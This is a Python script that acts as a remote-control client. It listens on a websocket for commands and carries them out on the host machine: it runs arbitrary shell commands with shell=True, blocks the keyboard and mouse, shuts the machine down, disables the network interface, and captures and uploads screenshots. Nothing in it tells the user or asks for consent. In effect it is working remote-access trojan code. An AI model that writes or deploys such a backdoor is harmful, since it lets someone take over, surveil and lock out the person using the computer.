import asyncio
import websockets
import websockets.exceptions
import pyautogui as pg
from pynput import keyboard , mouse
import os
import time
import requests
import socket
import subprocess
import webbrowser

pg.FAILSAFE = True
pg.PAUSE=0.5
inBlocked = False
kb = None
ms = None

def on_press(key):
    return False

def on_click(x,y,button,pressed):
    return False
def block_inputs():
    global kb ,ms,inBlocked
    if not inBlocked:
        kb = keyboard.Listener(on_press=on_press,suppress=True)
        ms = mouse.Listener(on_click=on_click,suppress=True)

        kb.start()
        ms.start()
        inBlocked = True
        print("blocked")

def unblock_inputs():
    global kb ,ms,inBlocked
    if inBlocked:
        kb.stop()
        ms.stop()
        inBlocked=False
        print("ublocked")

def handle_msg(msg):
    # print("auto")
    # pg.moveTo(300,300,0.5)
    # pg.leftClick()
    # pg.typewrite("#"+msg,0.2)
    if msg == "block":
        block_inputs()
    elif msg == "unblock":
        unblock_inputs()
    elif msg == "shutdown":
        os.system("shutdown now")   
    elif msg=="cmd":
        pg.hotkey("ctrl","alt","t")
    elif msg=="desktop":
        pg.hotkey("ctrl","alt","d")   
    elif msg=="disableEthernet":
        os.system('netsh interface set interface "Ethernet" admin=disable')  
    elif msg=="screenshot":
        pc_name = socket.gethostname()
        filename = f"{pc_name}_screenshot.png"
        pg.screenshot(filename)
        url = "http://localhost:3000/upload"
        files = {"screenshot":open(filename,"rb")}
        requests.post(url,files=files)  
        os.remove(filename) 
    elif msg=="subprocess":
        desktop_path = os.path.join(os.path.expanduser("~"),"Desktop")
        result = subprocess.run(["ls",desktop_path],capture_output=True,text=True) 
        print(result.stdout)   
    else:
        pg.typewrite(msg)             

async def listen():
    uri = "ws://localhost:3000"
    while True:
        try:
            async with websockets.connect(uri) as websocket:
                while True:
                    message = await websocket.recv() 
                    print("Recieved : ", message)
                    if message.startswith("subprocess"):
                        
                        command = message[len("subprocess "):]
                        print(command)
                        subprocess.run(command,shell=True)
                    if message.startswith("browser"):
                    
                        command = message[len("browser "):]
                        print(command)
                        webbrowser.open(command)   
                    else:    
                        handle_msg(message)

        except (websockets.exceptions.ConnectionClosedError,ConnectionRefusedError):
            print("connection lost . Reconnecting in 3 seconds ...")
            await asyncio.sleep(3)

asyncio.run(listen())
